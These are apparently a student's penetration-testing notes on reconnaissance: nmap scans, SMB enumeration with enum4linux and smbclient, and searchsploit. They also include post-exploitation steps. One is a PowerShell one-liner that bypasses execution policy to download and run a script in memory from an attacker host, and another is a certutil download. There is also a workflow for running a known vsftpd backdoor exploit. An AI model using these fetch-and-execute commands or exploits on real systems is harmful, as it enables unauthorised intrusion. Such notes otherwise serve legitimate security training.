# Reconnaissance & Enumeration
 
nmap, enum4linux, JAWS, and searchsploit.
 
---
 
## Enumeration vs Exploitation vs Privilege Escalation
 
- **Enumeration** — gathering information about the target (enum4linux, nmap, JAWS)
- **Exploitation** — using a vulnerability to get initial access (Metasploit, MSFVenom, ExploitDB)
- **Privilege Escalation** — going from low-privilege user to admin/root after you're already in (PEASS-ng, Metasploit)
---
 
## nmap (Network Mapper)
 
nmap is a network reconnaissance tool. It discovers hosts, finds open ports, identifies services running on those ports, detects operating systems, and can run scripts to check for vulnerabilities. It's the first tool most pentesters reach for.
 
### Port states
 
| State | Meaning |
|---|---|
| `open` | Something is actively listening — a service is running |
| `closed` | Port is accessible but nothing is listening |
| `filtered` | A firewall is blocking probes — can't tell if open or closed |
| `unfiltered` | Port is accessible but nmap can't determine open/closed |
| `open|filtered` | Can't tell if it's open or filtered |
 
---
 
### Host discovery
 
```bash
# Ping scan — just check if hosts are up, don't scan ports
nmap -sn 192.168.170.0/24
 
# Skip discovery, assume host is up (useful when ICMP is blocked)
nmap -Pn 192.168.170.131
```
 
### Port scanning
 
```bash
# Default — top 1000 most common ports
nmap 192.168.170.131
 
# Specific ports
nmap -p 22,80,443 192.168.170.131
 
# Range
nmap -p 1-1000 192.168.170.131
 
# ALL 65535 ports — slow but thorough
nmap -p- 192.168.170.131
 
# Fast scan — top 100 ports only
nmap -F 192.168.170.131
 
# Whole subnet
nmap 192.168.0.0/24
```
 
### Scan techniques
 
```bash
# SYN scan (default when run as root) — fast, stealthy
# Sends SYN, waits for SYN-ACK (open) or RST (closed), never completes handshake
sudo nmap -sS 192.168.170.131
 
# TCP connect scan — full handshake, less stealthy, doesn't need root
nmap -sT 192.168.170.131
 
# UDP scan — checks UDP ports (DNS, SNMP, DHCP live here); much slower
sudo nmap -sU 192.168.170.131
 
# Combined TCP and UDP
sudo nmap -sS -sU 192.168.170.131
```
 
### Service and OS detection
 
```bash
# Version detection — what software/version on each open port
nmap -sV 192.168.170.131
 
# OS detection
sudo nmap -O 192.168.170.131
 
# Aggressive — OS detect + version detect + scripts + traceroute
nmap -A 192.168.170.131
```
 
### Banner grabbing
 
```bash
# Grab banners from services
nmap -sV --script=banner 192.168.170.131
 
# Target a specific port
nmap -sV --script=banner -p 22 192.168.170.131
```
 
The banner is the text a service sends when you first connect — often reveals software name and version.
 
### NSE (Nmap Scripting Engine)
 
```bash
# Default scripts (safe, useful info gathering)
nmap -sC 192.168.170.131
 
# Version detect + default scripts (most common combo)
nmap -sV -sC 192.168.170.131
 
# Vulnerability scanning
nmap --script vuln 192.168.170.131
 
# Run a specific script
nmap --script http-title -p 80 192.168.170.131
 
# List available scripts
ls /usr/share/nmap/scripts/
 
# Search scripts by name
ls /usr/share/nmap/scripts/ | grep ssh
```
 
### Output formats
 
```bash
# Normal text
nmap -oN scan.txt 192.168.170.131
 
# XML (useful for importing into other tools)
nmap -oX scan.xml 192.168.170.131
 
# Greppable
nmap -oG scan.gnmap 192.168.170.131
 
# All three at once
nmap -oA scan_results 192.168.170.131
```
 
### Timing and stealth
 
`-T0` through `-T5` — paranoid to insane.
```bash
nmap -T4 <target>    # aggressive; good for local VMs
nmap -T1 <target>    # slow and quiet; avoids IDS detection
```
 
---
 
### Typical CTF workflow
 
```bash
# 1. Quick scan to see what's obviously open
nmap -F TARGET_IP
 
# 2. Full port scan in background
nmap -p- -T4 TARGET_IP -oN full_scan.txt
 
# 3. Deep scan on discovered ports
nmap -sV -sC -p <discovered_ports> TARGET_IP -oN detailed_scan.txt
 
# 4. Vuln scan if needed
nmap --script vuln -p <discovered_ports> TARGET_IP
```
 
---
 
## SMB / Windows enumeration with NSE
 
```bash
# SMB shares
nmap --script smb-enum-shares -p 445 TARGET_IP
 
# SMB users
nmap --script smb-enum-users -p 445 TARGET_IP
 
# SMB groups
nmap --script smb-enum-groups -p 445 TARGET_IP
 
# Who's logged in
nmap --script smb-enum-sessions -p 445 TARGET_IP
 
# OS via SMB
nmap --script smb-os-discovery -p 445 TARGET_IP
 
# Known SMB vulns (EternalBlue etc.)
nmap --script "smb-vuln*" -p 445 TARGET_IP
 
# All SMB scripts
nmap --script "smb-enum*" -p 445 TARGET_IP
 
# With creds
nmap --script smb-enum-shares \
    --script-args smbusername=admin,smbpassword=pass123 \
    -p 445 TARGET_IP
```
 
## Other enumeration scripts
 
```bash
# DNS
nmap --script dns-brute TARGET_IP
 
# SNMP (if 161 is open — reveals tons of system info)
nmap -sU --script snmp-info -p 161 TARGET_IP
nmap -sU --script snmp-brute -p 161 TARGET_IP
 
# LDAP (Active Directory)
nmap --script ldap-search -p 389 TARGET_IP
 
# MSRPC
nmap --script msrpc-enum -p 135 TARGET_IP
 
# NetBIOS
nmap --script nbstat -p 137 -sU TARGET_IP
 
# Banners across common services
nmap -sV --script=banner -p 21,22,25,80,139,445,3389 TARGET_IP
```
 
---
 
## enum4linux
 
A Perl script pre-installed on Kali. Wraps Samba tools (`rpcclient`, `smbclient`, `nmblookup`, `net`) to automate pulling information from SMB (Server Message Block) services on Windows or Linux machines.
 
SMB runs on ports **139** and **445**. It's one of the most information-rich protocols to enumerate — a misconfigured SMB service can hand you usernames, password policies, shared folders, group memberships, and OS details — sometimes without needing credentials.
 
### Essential commands
 
```bash
# Run ALL basic checks (the go-to command)
enum4linux -a TARGET_IP
 
# Users
enum4linux -U TARGET_IP
 
# Shares
enum4linux -S TARGET_IP
 
# Groups
enum4linux -G TARGET_IP
 
# Password policy
enum4linux -P TARGET_IP
 
# OS info
enum4linux -o TARGET_IP
 
# With credentials
enum4linux -u username -p password -a TARGET_IP
 
# Verbose
enum4linux -v -a TARGET_IP
```
 
### Typical workflow
 
1. nmap finds ports 139/445 open on a target
2. Run `enum4linux -a TARGET_IP`
3. Review the output for usernames, accessible shares, password policies
4. Use discovered usernames with Hydra for brute-forcing
5. Use `smbclient` to connect to accessible shares
### Connecting to discovered shares
 
```bash
# List shares
smbclient -L //TARGET_IP -N
 
# Connect (null session / anonymous)
smbclient //TARGET_IP/share_name -N
 
# With credentials
smbclient //TARGET_IP/share_name -U username
```
 
---
 
## JAWS — Just Another Windows Enum Script
 
A PowerShell script you run on a Windows machine you've already compromised to find privilege escalation opportunities. Post-exploitation — you use it after initial access.
 
### Getting JAWS on the target
 
**Method 1 — download from your attacker box:**
 
Host it on Kali:
```bash
cd /path/to/jaws
python3 -m http.server 8080
```
 
Download it on the Windows target:
```
certutil -urlcache -f http://KALI_IP:8080/jaws-enum.ps1 C:\temp\jaws-enum.ps1
```
 
**Method 2 — run directly, no disk write (stealthier):**
```
powershell.exe -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://KALI_IP:8080/jaws-enum.ps1'))"
```
 
---
 
## ExploitDB and searchsploit
 
ExploitDB is a public database of known exploits and vulnerabilities maintained by Offensive Security. When nmap `-sV` gives you exact software versions, ExploitDB is where you go next.
 
### searchsploit examples
 
```bash
# By software name
searchsploit apache 2.4
 
# Specific product and version
searchsploit openssh 7.2
 
# Windows local privilege escalation
searchsploit windows local privilege escalation
 
# SMB exploits
searchsploit smb
 
# By CVE
searchsploit CVE-2021-44228
 
# Copy an exploit to your working directory
searchsploit -m 17491
```
 
### Typical workflow
 
1. nmap discovers `vsftpd 2.3.4` on port 21
2. `searchsploit vsftpd 2.3.4` → finds known backdoor
3. `searchsploit -m 17491` → copies it to your working directory
4. Read the code, understand what it does
5. Run it against the target
---
 
## Info sources — where to hunt for current tech and vulns
 
**Current and emerging tech:**
- Gartner (gartner.com)
- Forrester Research (forrester.com)
- DEF CON (defcon.org)
- Black Hat (blackhat.com)
- SANS Summits and Webcasts (sans.org/webcasts)
**Vulnerability research and novel attack vectors:**
- Google Project Zero blog
- Phrack magazine
- PortSwigger Research Blog
**Current security vulnerabilities:**
- NIST NVD (nvd.nist.gov)
- MITRE CVE Database (cve.mitre.org)
- MITRE ATT&CK Framework (attack.mitre.org)
- CISA KEV Catalog (cisa.gov/known-exploited-vulnerabilities-catalog)
- ExploitDB
